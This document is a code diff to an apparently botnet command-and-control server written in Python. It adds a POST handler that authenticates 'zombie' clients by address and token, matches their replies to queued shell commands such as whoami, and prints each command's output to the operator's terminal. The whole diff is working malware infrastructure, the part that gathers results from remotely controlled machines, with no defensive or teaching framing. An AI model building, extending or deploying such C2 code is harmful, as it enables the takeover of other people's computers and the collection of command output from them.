@@ -15,6 +15,7 @@ import json
 from datetime import datetime
 from modules.terminal import Terminal
 import re
+from cgi import parse_header, parse_multipart
 
 
 serverLogger = Logger(file_name='server')
@@ -48,6 +49,7 @@ class ServerModule:
         # if command starts with : #specific_command: it is a special command like:
         # #specific_command:!whoami
         self.queued_commands = []
+        self.deleted_queued_commands = []
         self.default_target = None
 
     def start_server(self):
@@ -249,12 +251,131 @@ class WebServer(BaseHTTPRequestHandler):
             # remove queued command after sending it to zombie
             serverModule.queued_commands.remove([client_address, __command, __command_id])
 
+            # add the list in new list for response
+            serverModule.deleted_queued_commands.append([client_address, __command, __command_id])
+
             return
 
         else:
             self.send_response(200)
             self.send_header("Content-type", "text/html")
             self.end_headers()
+
+    def do_POST(self):
+
+        self.send_response(200)
+        self.end_headers()
+        try:
+            ctype, pdict = parse_header(self.headers['content-type'])
+        except TypeError:
+            return
+
+        if ctype == 'application/x-www-form-urlencoded':
+
+            length = int(self.headers['content-length'])
+            post_key_vals = parse_qs(
+                self.rfile.read(length),
+                keep_blank_values=False)
+
+        else:
+            return
+
+        temp_post_key_val = {}
+        for k in post_key_vals.keys():
+            value = post_key_vals[k][0]
+            k = k.decode()
+            value = value.decode()
+            temp_post_key_val[k] = value
+
+        post_key_vals = temp_post_key_val
+
+        try:
+
+            resp_type = post_key_vals['resp_type']
+            client_address = post_key_vals['client_id']
+            client_req_token = post_key_vals['token']
+
+        except KeyError:
+            resp_text = self.send_bad_param_resp()
+            self.wfile.write(bytes(resp_text, 'UTF-8'))
+            return
+
+        temp_zombies_addr_and_token_list = []  # [zombie_address1, token1, zombie_address2, token2]
+        for zc in serverModule.zombies_addresses_and_tokens:
+            temp_zombies_addr_and_token_list.append(zc[0])
+            temp_zombies_addr_and_token_list.append(zc[1])
+
+        if client_address not in temp_zombies_addr_and_token_list:  # if client is not in the list of clients send reset msg
+            resp_text = self.send_reset_resp()
+            self.wfile.write(bytes(resp_text, 'UTF-8'))
+            return
+
+        token_index_in_temp_list = temp_zombies_addr_and_token_list.index(client_address) + 1
+        client_original_token = temp_zombies_addr_and_token_list[token_index_in_temp_list]
+
+        if client_original_token != client_req_token:  # if the token is not correct send bad token msg
+            resp_text = self.send_bad_token_resp()
+            self.wfile.write(bytes(resp_text, 'UTF-8'))
+            return
+
+        if resp_type == 'send_output':
+            try:
+
+                command_id = post_key_vals['cmd_id']
+                command_output = post_key_vals['output']
+
+            except KeyError:
+                resp_text = self.send_bad_param_resp()
+                self.wfile.write(bytes(resp_text, 'UTF-8'))
+                return
+
+            temp_list_zc_cmd_id_list = []
+
+            # za_cmd_id is [zombie_address, command, command_id]
+            for za_cmd_id_list in serverModule.deleted_queued_commands:
+                for za_cmd_id in za_cmd_id_list:
+                    temp_list_zc_cmd_id_list.append(za_cmd_id)
+
+            # if client is not in deleted_queued_commands list
+            if client_address not in temp_list_zc_cmd_id_list:
+                return
+
+            client_address_indices = [i for i, x in enumerate(temp_list_zc_cmd_id_list) if x == client_address]
+            global cmd_id_is_found, client_address_index
+            cmd_id_is_found = False
+            client_address_index = None
+            # check if specific client_address has that command_id or not
+            for i in client_address_indices:
+                cmd_id_in_list = temp_list_zc_cmd_id_list[i + 2]
+                if cmd_id_in_list == command_id:
+                    cmd_id_is_found = True
+                    client_address_index = i
+                    break
+
+            if not cmd_id_is_found:
+                resp_text = self.send_unknown_cmd_id()
+                self.wfile.write(bytes(resp_text, 'UTF-8'))
+                return
+
+            command_entered = temp_list_zc_cmd_id_list[client_address_index + 1]
+
+            if command_entered.startswith('#special_command:!'):
+                command_entered = command_entered.split('!')[1]
+
+            command_output_text_in_terminal = '''
++----------------------------------------+
+A Response From Zombie : {}
+Command : {} 
+Command ID : {}
+Output:
+{}
++----------------------------------------+
+            '''.format(client_address, command_entered, command_id, command_output)
+
+            terminalLogger.log(command_output_text_in_terminal)
+
+            # delete the command from serverModule.deleted_queued_commands list
+            serverModule.deleted_queued_commands.remove([client_address, command_entered, command_id])
 
     def log_message(self, format, *args):
         pass
@@ -316,4 +437,18 @@ class WebServer(BaseHTTPRequestHandler):
             'cmd_id' : cmd_id
         }
         json_string = json.dumps(resp_structure)
+        return json_string
+
+    def send_bad_param_resp(self):
+        '''
+        send bad parameters response
+        '''
+        json_string = json.dumps({'resp_type' : 'bad_params'})
+        return json_string
+
+    def send_unknown_cmd_id(self):
+        '''
+        send unknown cmd id response when cmd id is invalid
+        '''
+        json_string = json.dumps({'resp_type' : 'unknown_cmd_id'})
         return json_string
